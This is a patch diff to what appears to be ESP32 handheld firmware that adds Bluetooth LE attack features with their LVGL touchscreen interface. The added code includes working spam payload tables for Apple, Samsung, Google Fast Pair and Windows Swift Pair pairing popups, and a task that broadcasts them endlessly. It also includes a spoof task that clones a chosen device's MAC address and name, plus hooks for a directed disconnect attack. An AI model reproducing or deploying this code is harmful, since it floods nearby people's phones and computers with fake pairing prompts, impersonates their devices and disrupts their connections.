+                                hp += snprintf(hex + hp, sizeof(hex) - hp,
+                                               "%02X", chr->probe_frames[fi][bi]);
+                            if (flen > 32)
+                                snprintf(hex + hp, sizeof(hex) - hp, "...");
+                            PR_ROW(scrl, hex, &lv_font_montserrat_12, lv_color_make(100, 210, 255));
+                            /* ASCII — all captured bytes */
+                            char asc[80] = "      ";
+                            int ap = 6;
+                            for (int bi = 0; bi < flen && bi < 64; bi++) {
+                                uint8_t b = chr->probe_frames[fi][bi];
+                                asc[ap++] = (b >= 0x20 && b < 0x7F) ? (char)b : '.';
+                            }
+                            asc[ap] = '\0';
+                            PR_ROW(scrl, asc, &lv_font_montserrat_12, lv_color_make(160, 210, 160));
+                        }
+                    } else {
+                        PR_ROW(scrl, "  Subscribed: no data in 8s window",
+                               &lv_font_montserrat_12, lv_color_make(200, 200, 100));
+                    }
+                } else {
+                    PR_ROW(scrl, "  Subscribe failed (auth required?)",
+                           &lv_font_montserrat_12, lv_color_make(200, 140, 50));
+                }
+            }
+        }
+
+        if (probed == 0) {
+            PR_ROW(scrl, "No subscribable characteristics found.",
+                   &lv_font_montserrat_14, lv_color_make(200, 200, 100));
+        } else {
+            char sum[64];
+            snprintf(sum, sizeof(sum), "Summary: %d probed, %d with data", probed, got_data);
+            PR_ROW(scrl, sum, &lv_font_montserrat_12, ui_muted_color());
+        }
+    }
+
+pr_done:;
+    lv_obj_t *pr_back = lv_btn_create(function_page);
+    lv_obj_set_size(pr_back, 110, 32);
+    lv_obj_align(pr_back, LV_ALIGN_BOTTOM_MID, 0, -6);
+    lv_obj_set_style_bg_color(pr_back, lv_color_hex(0x7B1FA2), LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_color(pr_back, lv_color_lighten(lv_color_hex(0x7B1FA2), 40), LV_STATE_PRESSED);
+    lv_obj_set_style_border_width(pr_back, 0, 0);
+    lv_obj_set_style_radius(pr_back, 8, 0);
+    lv_obj_t *pr_bl = lv_label_create(pr_back);
+    lv_label_set_text(pr_bl, LV_SYMBOL_LEFT "  Back");
+    lv_obj_set_style_text_font(pr_bl, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(pr_bl, lv_color_white(), 0);
+    lv_obj_center(pr_bl);
+    lv_obj_add_event_cb(pr_back, gw_probe_result_back_cb, LV_EVENT_CLICKED, NULL);
+#undef PR_ROW
+}
+
 /* ── GATT Walker result detail screen ───────────────────────────── */
 
 static void gw_result_back_cb(lv_event_t *e)
 {
     (void)e;
     show_bt_attack_tiles_screen();
+}
+
+static void gw_probe_btn_cb(lv_event_t *e)
+{
+    (void)e;
+    gw_state_t st = gw_get_state();
+    if (st != GW_STATE_COMPLETE && st != GW_STATE_PROBE_DONE) return;
+    g_probe_back = GW_PROBE_BACK_GATT_RESULT;
+    if (gw_probe_start(8000))
+        show_gw_probe_running_screen();
 }
 
 static void show_gw_result_screen(void)
@@ -19072,8 +19598,12 @@ static void show_gw_result_screen(void)
                 gw_chr_props_str(chr->properties, prop_buf, sizeof(prop_buf));
                 char prop_desc[96];
                 s_chr_props_desc(chr->properties, prop_desc, sizeof(prop_desc));
-                char prop_row[140];
-                snprintf(prop_row, sizeof(prop_row), "    Props: %s (%s)", prop_buf, prop_desc);
+                char prop_row[180];
+                if (chr->properties & (0x10 | 0x20))
+                    snprintf(prop_row, sizeof(prop_row), "    Props: %s (%s)  [~CCCD]",
+                             prop_buf, prop_desc);
+                else
+                    snprintf(prop_row, sizeof(prop_row), "    Props: %s (%s)", prop_buf, prop_desc);
                 GW_ROW(scrl, prop_row, &lv_font_montserrat_12, COLOR_MATERIAL_ORANGE);
 
                 /* Read data + ASCII */
@@ -19121,14 +19651,51 @@ static void show_gw_result_screen(void)
                         GW_ROW(scrl, row, &lv_font_montserrat_12, ui_muted_color());
                     }
                 }
+
+                /* Probe results (shown after Extended Probe runs) */
+                if (chr->probe_attempted) {
+                    if (chr->probe_cccd_ok && chr->probe_frame_count > 0) {
+                        char prow[64];
+                        snprintf(prow, sizeof(prow), "    Probe: %d frame(s)",
+                                 chr->probe_frame_count);
+                        GW_ROW(scrl, prow, &lv_font_montserrat_12, COLOR_MATERIAL_GREEN);
+                        for (int fi = 0; fi < chr->probe_frame_count && fi < 2; fi++) {
+                            char hex[80] = "      ";
+                            int hpos = 6;
+                            for (int bi = 0; bi < chr->probe_frame_lens[fi] && bi < 16; bi++)
+                                hpos += snprintf(hex + hpos, sizeof(hex) - hpos,
+                                                 "%02X", chr->probe_frames[fi][bi]);
+                            GW_ROW(scrl, hex, &lv_font_montserrat_12,
+                                   lv_color_make(100, 210, 255));
+                        }
+                    } else if (chr->probe_attempted && !chr->probe_cccd_ok) {
+                        GW_ROW(scrl, "    Probe: no response",
+                               &lv_font_montserrat_12, lv_color_make(200, 140, 50));
+                    }
+                }
             }
         }
     }
 
 gw_res_done:;
+    /* ── Bottom bar: [Ext. Probe] [Back] ── */
+    lv_obj_t *probe_btn = lv_btn_create(function_page);
+    lv_obj_set_size(probe_btn, 108, 32);
+    lv_obj_align(probe_btn, LV_ALIGN_BOTTOM_MID, -62, -6);
+    lv_obj_set_style_bg_color(probe_btn, lv_color_hex(0xC62828), LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_color(probe_btn, lv_color_lighten(lv_color_hex(0xC62828), 40), LV_STATE_PRESSED);
+    lv_obj_set_style_border_width(probe_btn, 0, 0);
+    lv_obj_set_style_radius(probe_btn, 8, 0);
+    lv_obj_t *probe_lbl = lv_label_create(probe_btn);
+    lv_label_set_text(probe_lbl, LV_SYMBOL_AUDIO "  Ext. Probe");
+    lv_obj_set_style_text_font(probe_lbl, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(probe_lbl, lv_color_white(), 0);
+    lv_obj_center(probe_lbl);
+    lv_obj_add_event_cb(probe_btn, gw_probe_btn_cb, LV_EVENT_CLICKED, NULL);
+
     lv_obj_t *back_btn = lv_btn_create(function_page);
-    lv_obj_set_size(back_btn, 110, 32);
-    lv_obj_align(back_btn, LV_ALIGN_BOTTOM_MID, 0, -6);
+    lv_obj_set_size(back_btn, 108, 32);
+    lv_obj_align(back_btn, LV_ALIGN_BOTTOM_MID, 62, -6);
     lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x7B1FA2), LV_STATE_DEFAULT);
     lv_obj_set_style_bg_color(back_btn, lv_color_lighten(lv_color_hex(0x7B1FA2), 40), LV_STATE_PRESSED);
     lv_obj_set_style_border_width(back_btn, 0, 0);
@@ -19149,7 +19716,7 @@ static void gw_update_screen_ui(void)
 
     gw_state_t st   = (gw_state_t)gw_ui_state;
 
-    /* Auto-navigate to full detail screen on success */
+    /* Auto-navigate to full detail screen on success or after probe */
     if (st == GW_STATE_COMPLETE) {
         show_gw_result_screen();
         return;
@@ -19193,7 +19760,7 @@ static void gw_update_screen_ui(void)
             if (r) {
                 snprintf(t, sizeof(t), "%d svcs  %d chrs\nFP: 0x%08lX\n%s",
                          r->svc_count, (int)gw_ui_chr_count,
-                         r->fingerprint, r->filepath + 9 /* skip /sdcard/ */);
+                         r->fingerprint, r->filepath + 8 /* skip /sdcard/ */);
             } else {
                 snprintf(t, sizeof(t), "Done");
             }
@@ -19334,6 +19901,10 @@ static void show_bt_attack_tiles_screen(void)
     lv_obj_t *add_lookout_tile = create_tile(tiles, MY_SYMBOL_BLUETOOTH_B, "Add to\nBT Lookout", COLOR_MATERIAL_RED, NULL, NULL);
     lv_obj_add_event_cb(add_lookout_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"Add to Lookout");
 
+    // BT Attacks — opens directed attack menu (Spoof, Disconnect) targeting selected device
+    lv_obj_t *attacks_tile = create_tile(tiles, LV_SYMBOL_WARNING, "BT\nAttacks", COLOR_MATERIAL_AMBER, NULL, NULL);
+    lv_obj_add_event_cb(attacks_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"Directed BT Attacks");
+
     /* Back button — return to BT Scan & Select */
     lv_obj_t *back_btn = lv_btn_create(function_page);
     lv_obj_set_size(back_btn, 110, 30);
@@ -19404,7 +19975,1527 @@ static void show_stub_screen(const char *name, void (*back_fn)(void))
     lv_obj_add_event_cb(back_btn, stub_back_btn_cb, LV_EVENT_CLICKED, NULL);
 }
 
+// ============================================================================
+// BLE ATTACK IMPLEMENTATIONS
+// ============================================================================
+
+// ── BLE Spam payload tables ──────────────────────────────────────────────────
+// Apple Proximity Pairing: company ID 0x004C, type 0x10, len 0x05
+// Each payload triggers a pairing popup on nearby iOS devices
+static const uint8_t s_apple_payloads[][10] = {
+    {0x4C,0x00,0x10,0x05,0x01,0x18,0x75,0x55,0x01,0x00}, // AirPods
+    {0x4C,0x00,0x10,0x05,0x02,0x18,0x75,0x55,0x01,0x00}, // PowerBeats
+    {0x4C,0x00,0x10,0x05,0x03,0x18,0x75,0x55,0x01,0x00}, // PowerBeats Pro
+    {0x4C,0x00,0x10,0x05,0x05,0x18,0x75,0x55,0x01,0x00}, // AirPods 3rd Gen
+    {0x4C,0x00,0x10,0x05,0x06,0x18,0x75,0x55,0x02,0x00}, // AirPods 3rd Gen case
+    {0x4C,0x00,0x10,0x05,0x09,0x18,0x75,0x55,0x01,0x00}, // AirPods Pro
+    {0x4C,0x00,0x10,0x05,0x0A,0x18,0x75,0x55,0x01,0x00}, // AirPods Pro 2
+    {0x4C,0x00,0x10,0x05,0x0B,0x18,0x75,0x55,0x01,0x00}, // AirPods Max
+    {0x4C,0x00,0x10,0x05,0x0C,0x18,0x75,0x55,0x01,0x00}, // Beats Solo Pro
+    {0x4C,0x00,0x10,0x05,0x0D,0x18,0x75,0x55,0x01,0x00}, // Beats Studio Buds
+    {0x4C,0x00,0x10,0x05,0x0E,0x18,0x75,0x55,0x01,0x00}, // Beats Flex
+    {0x4C,0x00,0x10,0x05,0x0F,0x18,0x75,0x55,0x01,0x00}, // BeatsX
+    {0x4C,0x00,0x10,0x05,0x11,0x18,0x75,0x55,0x01,0x00}, // Beats Studio Buds+
+};
+#define APPLE_PAYLOAD_COUNT (int)(sizeof(s_apple_payloads)/sizeof(s_apple_payloads[0]))
+
+// Samsung Galaxy Watch fast-connect (company ID 0x0075)
+static const uint8_t s_samsung_payloads[][10] = {
+    {0x75,0x00,0x42,0x09,0x81,0x02,0x14,0x15,0x03,0x21},
+    {0x75,0x00,0x00,0x00,0x80,0x00,0x00,0x00,0x00,0x00},
+};
+#define SAMSUNG_PAYLOAD_COUNT (int)(sizeof(s_samsung_payloads)/sizeof(s_samsung_payloads[0]))
+
+// Google Fast Pair — service data UUID 0xFE2C (little-endian) + 3-byte model ID
+// Format used in ble_hs_adv_fields.svc_data_uuid16: [UUID_LO UUID_HI data...]
+static const uint8_t s_google_fp_svc[] = {0x2C,0xFE,0x00,0x00,0x00};
+static const uint8_t s_google_fp_svc2[] = {0x2C,0xFE,0x00,0xC0,0x57};
+#define GOOGLE_PAYLOAD_COUNT 2
+
+// Windows Swift Pair — service UUID 0xFE14 + payload
+static const uint8_t s_windows_sp_svc[] = {0x14,0xFE,0x80,0x00,0x00,0x00,0x00};
+static const uint8_t s_windows_sp_svc2[] = {0x14,0xFE,0x80,0x01,0x00,0x00,0x00};
+#define WINDOWS_PAYLOAD_COUNT 2
+
+// ── SAS proceed wrappers — pre-set target from BT Scan & Select ──────────────
+static void ble_spoof_proceed_from_sas(void)
+{
+    s_ble_spoof_return_fn = show_directed_bt_attacks_screen;
+    // bt_sas_selected_idx may be -1 (reset_function_page_children cleared it),
+    // but bt_sas_target_addr/name are preserved — copy them as the authoritative target.
+    memcpy(ble_spoof_target_mac, bt_sas_target_addr, 6);
+    strncpy(ble_spoof_target_name_str, bt_sas_target_name, sizeof(ble_spoof_target_name_str) - 1);
+    ble_spoof_target_name_str[sizeof(ble_spoof_target_name_str) - 1] = '\0';
+    ble_spoof_target_company_id = 0;
+    ble_spoof_target_idx = 0; // dummy non-negative so start_cb passes the check
+    show_ble_spoof_directed_screen();
+}
+
+static void ble_disc_proceed_from_sas(void)
+{
+    s_ble_disc_return_fn = show_directed_bt_attacks_screen;
+    memcpy(ble_disc_target_mac, bt_sas_target_addr, 6);
+    ble_disc_target_addr_type = bt_sas_target_addr_type;
+    ble_disc_target_idx = 0; // dummy non-negative so start_cb passes the check
+    show_ble_disc_directed_screen();
+}
+
+// ── BLE Spam task ─────────────────────────────────────────────────────────────
+static void ble_spam_task(void *pvParameters)
+{
+    (void)pvParameters;
+    int apple_idx = 0, samsung_idx = 0, google_idx = 0, windows_idx = 0;
+    int mode_round = 0; // cycles through modes when ALL
+
+    while (ble_spam_active) {
+        ble_gap_adv_stop(); // stop any previous advertising (ignore return)
+
+        struct ble_hs_adv_fields fields;
+        memset(&fields, 0, sizeof(fields));
+        fields.flags = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;
+
+        int cur_mode = ble_spam_mode;
+        if (cur_mode == BLE_SPAM_MODE_ALL) {
+            cur_mode = mode_round % 4;
+            mode_round++;
+        }
+
+        bool use_svc = false;
+        const uint8_t *svc_data = NULL;
+        uint8_t svc_data_len = 0;
+
+        switch (cur_mode) {
+        case BLE_SPAM_MODE_APPLE:
+            fields.mfg_data = s_apple_payloads[apple_idx];
+            fields.mfg_data_len = sizeof(s_apple_payloads[0]);
+            apple_idx = (apple_idx + 1) % APPLE_PAYLOAD_COUNT;
+            break;
+        case BLE_SPAM_MODE_SAMSUNG:
+            fields.mfg_data = s_samsung_payloads[samsung_idx];
+            fields.mfg_data_len = sizeof(s_samsung_payloads[0]);
+            samsung_idx = (samsung_idx + 1) % SAMSUNG_PAYLOAD_COUNT;
+            break;
+        case BLE_SPAM_MODE_GOOGLE:
+            use_svc = true;
+            svc_data = (google_idx == 0) ? s_google_fp_svc : s_google_fp_svc2;
+            svc_data_len = sizeof(s_google_fp_svc);
+            google_idx = (google_idx + 1) % GOOGLE_PAYLOAD_COUNT;
+            break;
+        case BLE_SPAM_MODE_WINDOWS:
+        default:
+            use_svc = true;
+            svc_data = (windows_idx == 0) ? s_windows_sp_svc : s_windows_sp_svc2;
+            svc_data_len = sizeof(s_windows_sp_svc);
+            windows_idx = (windows_idx + 1) % WINDOWS_PAYLOAD_COUNT;
+            break;
+        }
+
+        if (use_svc) {
+            fields.svc_data_uuid16 = svc_data;
+            fields.svc_data_uuid16_len = svc_data_len;
+        }
+
+        int rc = ble_gap_adv_set_fields(&fields);
+        if (rc == 0) {
+            struct ble_gap_adv_params adv_params;
+            memset(&adv_params, 0, sizeof(adv_params));
+            adv_params.conn_mode = BLE_GAP_CONN_MODE_NON;
+            adv_params.disc_mode = BLE_GAP_DISC_MODE_GEN;
+            adv_params.itvl_min = BLE_GAP_ADV_FAST_INTERVAL1_MIN;
+            adv_params.itvl_max = BLE_GAP_ADV_FAST_INTERVAL1_MAX;
+            ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, BLE_HS_FOREVER,
+                              &adv_params, NULL, NULL);
+        }
+
+        vTaskDelay(pdMS_TO_TICKS(180));
+        ble_spam_count++;
+        ble_spam_needs_ui_update = true;
+    }
+
+    ble_gap_adv_stop();
+    ble_spam_task_handle = NULL;
+    vTaskDelete(NULL);
+}
+
+// ── BLE Spam screen helpers ───────────────────────────────────────────────────
+static void ble_spam_start_btn_cb(lv_event_t *e)
+{
+    (void)e;
+    if (ble_spam_active) {
+        // Stop
+        ble_spam_active = false;
+        lv_label_set_text(lv_obj_get_child(ble_spam_start_btn, 0), "START");
+        lv_obj_set_style_bg_color(ble_spam_start_btn, COLOR_MATERIAL_GREEN, LV_STATE_DEFAULT);
+    } else {
+        // Start
+        if (!ensure_ble_mode()) {
+            if (ble_spam_status_label)
+                lv_label_set_text(ble_spam_status_label, "BLE init failed!");
+            return;
+        }
+        ble_spam_count = 0;
+        ble_spam_active = true;
+        lv_label_set_text(lv_obj_get_child(ble_spam_start_btn, 0), "STOP");
+        lv_obj_set_style_bg_color(ble_spam_start_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
+        xTaskCreate(ble_spam_task, "ble_spam", 4096, NULL, 5, &ble_spam_task_handle);
+    }
+}
+
+static void ble_spam_back_cb(lv_event_t *e)
+{
+    (void)e;
+    ble_spam_active = false;
+    for (int i = 0; i < 20 && ble_spam_task_handle != NULL; i++)
+        vTaskDelay(pdMS_TO_TICKS(50));
+    ble_spam_ui_active = false;
+    ble_spam_status_label = NULL;
+    ble_spam_counter_label = NULL;
+    ble_spam_start_btn = NULL;
+    if (current_radio_mode == RADIO_MODE_BLE) {
+        ble_gap_adv_stop();
+        bt_nimble_deinit();
+        current_radio_mode = RADIO_MODE_NONE;
+    }
+    show_bt_attacks_screen();
+}
+
+static void ble_spam_mode_dd_cb(lv_event_t *e)
+{
+    lv_obj_t *dd = lv_event_get_target(e);
+    ble_spam_mode = (int)lv_dropdown_get_selected(dd);
+}
+
+static void show_ble_spam_screen(void)
+{
+    create_function_page_base("BLE Spam");
+    ble_spam_ui_active = true;
+    ble_spam_count = 0;
+
+    // Mode dropdown
+    lv_obj_t *mode_lbl = lv_label_create(function_page);
+    lv_label_set_text(mode_lbl, "Target Platform:");
+    lv_obj_set_style_text_font(mode_lbl, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(mode_lbl, ui_text_color(), 0);
+    lv_obj_align(mode_lbl, LV_ALIGN_TOP_LEFT, 8, 38);
+
+    lv_obj_t *dd = lv_dropdown_create(function_page);
+    lv_dropdown_set_options(dd, "Apple (Sour Apple)\nSamsung Fast Connect\nGoogle Fast Pair\nWindows Swift Pair\nAll Platforms");
+    lv_dropdown_set_selected(dd, (uint16_t)ble_spam_mode);
+    lv_obj_set_size(dd, lv_pct(96), 36);
+    lv_obj_align(dd, LV_ALIGN_TOP_MID, 0, 58);
+    lv_obj_set_style_bg_color(dd, ui_card_color(), LV_PART_MAIN);
+    lv_obj_set_style_text_color(dd, ui_text_color(), LV_PART_MAIN);
+    lv_obj_set_style_border_color(dd, ui_border_color(), LV_PART_MAIN);
+    lv_obj_t *dd_list = lv_dropdown_get_list(dd);
+    if (dd_list) {
+        lv_obj_set_style_bg_color(dd_list, ui_bg_color(), 0);
+        lv_obj_set_style_text_color(dd_list, ui_text_color(), 0);
+    }
+    lv_obj_add_event_cb(dd, ble_spam_mode_dd_cb, LV_EVENT_VALUE_CHANGED, NULL);
+
+    // Status label
+    ble_spam_status_label = lv_label_create(function_page);
+    lv_label_set_text(ble_spam_status_label, "Press START to begin");
+    lv_obj_set_style_text_font(ble_spam_status_label, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(ble_spam_status_label, ui_text_color(), 0);
+    lv_obj_align(ble_spam_status_label, LV_ALIGN_TOP_MID, 0, 104);
+
+    // Packet counter
+    ble_spam_counter_label = lv_label_create(function_page);
+    lv_label_set_text(ble_spam_counter_label, "Packets: 0");
+    lv_obj_set_style_text_font(ble_spam_counter_label, &lv_font_montserrat_20, 0);
+    lv_obj_set_style_text_color(ble_spam_counter_label, COLOR_MATERIAL_GREEN, 0);
+    lv_obj_align(ble_spam_counter_label, LV_ALIGN_TOP_MID, 0, 128);
+
+    // Start/Stop button
+    ble_spam_start_btn = lv_btn_create(function_page);
+    lv_obj_set_size(ble_spam_start_btn, 130, 44);
+    lv_obj_align(ble_spam_start_btn, LV_ALIGN_TOP_MID, 0, 170);
+    lv_obj_set_style_bg_color(ble_spam_start_btn, COLOR_MATERIAL_GREEN, LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_color(ble_spam_start_btn, lv_color_lighten(COLOR_MATERIAL_GREEN, 30), LV_STATE_PRESSED);
+    lv_obj_set_style_border_width(ble_spam_start_btn, 0, 0);
+    lv_obj_set_style_radius(ble_spam_start_btn, 10, 0);
+    lv_obj_t *start_lbl = lv_label_create(ble_spam_start_btn);
+    lv_label_set_text(start_lbl, "START");
+    lv_obj_set_style_text_font(start_lbl, &lv_font_montserrat_16, 0);
+    lv_obj_set_style_text_color(start_lbl, lv_color_white(), 0);
+    lv_obj_center(start_lbl);
+    lv_obj_add_event_cb(ble_spam_start_btn, ble_spam_start_btn_cb, LV_EVENT_CLICKED, NULL);
+
+    // Back button
+    lv_obj_t *back_btn = lv_btn_create(function_page);
+    lv_obj_set_size(back_btn, 110, 28);
+    lv_obj_align(back_btn, LV_ALIGN_BOTTOM_MID, 0, -10);
+    lv_obj_set_style_bg_color(back_btn, lv_color_make(60, 60, 60), LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_color(back_btn, lv_color_make(90, 90, 90), LV_STATE_PRESSED);
+    lv_obj_set_style_border_width(back_btn, 0, 0);
+    lv_obj_set_style_radius(back_btn, 8, 0);
+    lv_obj_set_flex_flow(back_btn, LV_FLEX_FLOW_ROW);
+    lv_obj_set_flex_align(back_btn, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
+    lv_obj_set_style_pad_column(back_btn, 4, 0);
+    lv_obj_t *back_icon = lv_label_create(back_btn);
+    lv_label_set_text(back_icon, LV_SYMBOL_LEFT);
+    lv_obj_set_style_text_font(back_icon, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(back_icon, lv_color_white(), 0);
+    lv_obj_t *back_lbl = lv_label_create(back_btn);
+    lv_label_set_text(back_lbl, "BT Attacks");
+    lv_obj_set_style_text_font(back_lbl, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(back_lbl, lv_color_white(), 0);
+    lv_obj_add_event_cb(back_btn, ble_spam_back_cb, LV_EVENT_CLICKED, NULL);
+}
+
+// ── BLE Device Spoof screen + task ───────────────────────────────────────────
+static void ble_spoof_task(void *pvParameters)
+{
+    (void)pvParameters;
+    // Use the authoritative MAC array — valid for both list-selected and SAS-directed entry
+    bool mac_valid = false;
+    for (int i = 0; i < 6; i++) if (ble_spoof_target_mac[i]) { mac_valid = true; break; }
+    if (!mac_valid) {
+        ble_spoof_active = false;
+        ble_spoof_task_handle = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
+
+    char mac_log[18]; bt_format_addr(ble_spoof_target_mac, mac_log);
+    ESP_LOGI(TAG, "BLE Spoof: cloning %s (%s)", ble_spoof_target_name_str, mac_log);
+
+    uint8_t spoof_mfg[8];
+    spoof_mfg[0] = ble_spoof_target_company_id & 0xFF;
+    spoof_mfg[1] = (ble_spoof_target_company_id >> 8) & 0xFF;
+    memcpy(spoof_mfg + 2, ble_spoof_target_mac, 6);
+
+    while (ble_spoof_active) {
+        ble_gap_adv_stop();
+
+        struct ble_hs_adv_fields fields;
+        memset(&fields, 0, sizeof(fields));
+        fields.flags = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;
+        fields.mfg_data = spoof_mfg;
+        fields.mfg_data_len = sizeof(spoof_mfg);
+        if (ble_spoof_target_name_str[0]) {
+            fields.name = (const uint8_t *)ble_spoof_target_name_str;
+            fields.name_len = strlen(ble_spoof_target_name_str);
+            fields.name_is_complete = 1;
+        }
+
+        if (ble_gap_adv_set_fields(&fields) == 0) {
+            struct ble_gap_adv_params adv_params;
+            memset(&adv_params, 0, sizeof(adv_params));
+            adv_params.conn_mode = BLE_GAP_CONN_MODE_NON;
+            adv_params.disc_mode = BLE_GAP_DISC_MODE_GEN;
+            adv_params.itvl_min = BLE_GAP_ADV_FAST_INTERVAL1_MIN;
+            adv_params.itvl_max = BLE_GAP_ADV_FAST_INTERVAL1_MAX;
+            ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, BLE_HS_FOREVER,
+                              &adv_params, NULL, NULL);
+        }
+        vTaskDelay(pdMS_TO_TICKS(200));
+        ble_spoof_needs_ui_update = true;
+    }
+
+    ble_gap_adv_stop();
+    ble_spoof_task_handle = NULL;
+    vTaskDelete(NULL);
+}
+
+static void ble_spoof_start_cb(lv_event_t *e)
+{
+    (void)e;
+    if (ble_spoof_active) {
+        ble_spoof_active = false;
+        lv_label_set_text(lv_obj_get_child(ble_spoof_start_btn, 0), "START SPOOF");
+        lv_obj_set_style_bg_color(ble_spoof_start_btn, COLOR_MATERIAL_GREEN, LV_STATE_DEFAULT);
+        if (ble_spoof_status_label) lv_label_set_text(ble_spoof_status_label, "Stopped.");
+    } else {
+        bool mac_ready = false;
+        for (int i = 0; i < 6; i++) if (ble_spoof_target_mac[i]) { mac_ready = true; break; }
+        if (!mac_ready) {
+            if (ble_spoof_status_label) lv_label_set_text(ble_spoof_status_label, "Select a device first!");
+            return;
+        }
+        if (!ensure_ble_mode()) {
+            if (ble_spoof_status_label) lv_label_set_text(ble_spoof_status_label, "BLE init failed!");
+            return;
+        }
+        ble_spoof_active = true;
+        lv_label_set_text(lv_obj_get_child(ble_spoof_start_btn, 0), "STOP");
+        lv_obj_set_style_bg_color(ble_spoof_start_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
+        char mac_s[18]; bt_format_addr(ble_spoof_target_mac, mac_s);
+        char sbuf[64]; snprintf(sbuf, sizeof(sbuf), "Spoofing: %s", mac_s);
+        if (ble_spoof_status_label) lv_label_set_text(ble_spoof_status_label, sbuf);
+        xTaskCreate(ble_spoof_task, "ble_spoof", 4096, NULL, 5, &ble_spoof_task_handle);
+    }
+}
+
+static void ble_spoof_back_cb(lv_event_t *e)
+{
+    (void)e;
+    ble_spoof_active = false;
+    for (int i = 0; i < 20 && ble_spoof_task_handle != NULL; i++)
+        vTaskDelay(pdMS_TO_TICKS(50));
+    ble_spoof_ui_active = false;
+    ble_spoof_status_label = NULL;
+    ble_spoof_start_btn = NULL;
+    ble_spoof_target_idx = -1;
+    memset(ble_spoof_target_mac, 0, 6);
+    memset(ble_spoof_target_name_str, 0, sizeof(ble_spoof_target_name_str));
+    if (current_radio_mode == RADIO_MODE_BLE) {
+        ble_gap_adv_stop();
+        bt_nimble_deinit();
+        current_radio_mode = RADIO_MODE_NONE;
+    }
+    void (*ret)(void) = s_ble_spoof_return_fn;
+    s_ble_spoof_return_fn = NULL;
+    if (ret) ret(); else show_bt_attacks_screen();
+}
+
+static void ble_spoof_device_tap_cb(lv_event_t *e)
+{
+    if (ble_spoof_active) return;
+    int idx = (int)(intptr_t)lv_event_get_user_data(e);
+    ble_spoof_target_idx = idx;
+    if (idx >= 0 && idx < bt_device_count) {
+        bt_device_info_t *d = &bt_devices[idx];
+        memcpy(ble_spoof_target_mac, d->addr, 6);
+        strncpy(ble_spoof_target_name_str, d->name, sizeof(ble_spoof_target_name_str) - 1);
+        ble_spoof_target_name_str[sizeof(ble_spoof_target_name_str) - 1] = '\0';
+        ble_spoof_target_company_id = d->company_id;
+        if (ble_spoof_status_label) {
+            char mac_s[18]; bt_format_addr(d->addr, mac_s);
+            char tbuf[64];
+            if (d->name[0])
+                snprintf(tbuf, sizeof(tbuf), "Target: %s", d->name);
+            else
+                snprintf(tbuf, sizeof(tbuf), "Target: %s", mac_s);
+            lv_label_set_text(ble_spoof_status_label, tbuf);
+        }
+    }
+}
+
+static void show_ble_spoof_screen(void)
+{
+    create_function_page_base("Device Spoof");
+    ble_spoof_ui_active = true;
+    // Do NOT reset ble_spoof_target_idx here — proceed_from_sas may have pre-set it
+
+    bool directed = (ble_spoof_target_idx >= 0 && ble_spoof_target_idx < bt_device_count);
+
+    if (directed) {
+        // Pre-selected path: show target info card, START immediately
+        bt_device_info_t *d = &bt_devices[ble_spoof_target_idx];
+        char mac_s[18]; bt_format_addr(d->addr, mac_s);
+
+        lv_obj_t *card = lv_obj_create(function_page);
+        lv_obj_set_size(card, lv_pct(96), 70);
+        lv_obj_align(card, LV_ALIGN_TOP_MID, 0, 36);
+        lv_obj_set_style_bg_color(card, ui_card_color(), 0);
+        lv_obj_set_style_border_color(card, COLOR_MATERIAL_ORANGE, 0);
+        lv_obj_set_style_border_width(card, 2, 0);
+        lv_obj_set_style_radius(card, 8, 0);
+        lv_obj_set_style_pad_all(card, 8, 0);
+        lv_obj_set_flex_flow(card, LV_FLEX_FLOW_COLUMN);
+        lv_obj_set_flex_align(card, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER);
+        lv_obj_clear_flag(card, LV_OBJ_FLAG_SCROLLABLE);
+
+        lv_obj_t *name_lbl = lv_label_create(card);
+        lv_label_set_text(name_lbl, d->name[0] ? d->name : "(unnamed)");
+        lv_obj_set_style_text_font(name_lbl, &lv_font_montserrat_14, 0);
+        lv_obj_set_style_text_color(name_lbl, ui_text_color(), 0);
+        lv_label_set_long_mode(name_lbl, LV_LABEL_LONG_DOT);
+        lv_obj_set_width(name_lbl, lv_pct(100));
+
+        lv_obj_t *mac_lbl = lv_label_create(card);
+        lv_label_set_text(mac_lbl, mac_s);
+        lv_obj_set_style_text_font(mac_lbl, &lv_font_montserrat_12, 0);
+        lv_obj_set_style_text_color(mac_lbl, COLOR_MATERIAL_ORANGE, 0);
+
+        // Status label
+        char status_buf[48];
+        snprintf(status_buf, sizeof(status_buf), "Ready - press START SPOOF");
+        ble_spoof_status_label = lv_label_create(function_page);
+        lv_label_set_text(ble_spoof_status_label, status_buf);
+        lv_obj_set_style_text_font(ble_spoof_status_label, &lv_font_montserrat_12, 0);
+        lv_obj_set_style_text_color(ble_spoof_status_label, ui_text_color(), 0);
+        lv_obj_align(ble_spoof_status_label, LV_ALIGN_TOP_MID, 0, 116);
+    } else {
+        // Fallback: device selection list
+        ble_spoof_target_idx = -1;
+        lv_obj_t *list_lbl = lv_label_create(function_page);
+        lv_label_set_text(list_lbl, "Select target device:");
+        lv_obj_set_style_text_font(list_lbl, &lv_font_montserrat_12, 0);
+        lv_obj_set_style_text_color(list_lbl, ui_text_color(), 0);
